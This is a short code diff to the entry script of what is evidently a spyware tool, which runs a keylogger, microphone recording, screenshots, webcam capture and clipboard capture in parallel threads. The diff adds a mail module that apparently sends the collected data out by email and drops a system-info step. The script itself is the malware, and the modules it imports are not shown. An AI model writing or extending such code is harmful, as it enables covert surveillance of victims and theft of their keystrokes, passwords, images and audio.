@@ -8,23 +8,17 @@ from src.screenshots import Screenshots
 from src.microphone import Microphone
 from src.webcamera import WebCamera
 from src.clipboard import Clipboard
+from src.send_mail import Mail
 
-from src.make_dir import run
+from src.create_files import make_dir
 
 def microphone():
     m = Microphone()
     m.run()
 
-def mkdir():
-    run()
-
 def screenshot():
     screen = Screenshots()
     screen.run()
-
-def system_info():
-    sysf = SysInfo()
-    sysf.run()
 
 def keylogger():
     k = KeyLogger()
@@ -38,13 +32,17 @@ def clipboard():
     cb = Clipboard()
     cb.run()
 
+def mail():
+    m = Mail()
+    m.run()
+
 
 if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        executor.submit(mkdir)
+        executor.submit(make_dir)
         executor.submit(microphone)
         executor.submit(screenshot)
-        executor.submit(system_info)
         executor.submit(keylogger)
         executor.submit(clipboard)
         executor.submit(web_camera)
+        executor.submit(mail)
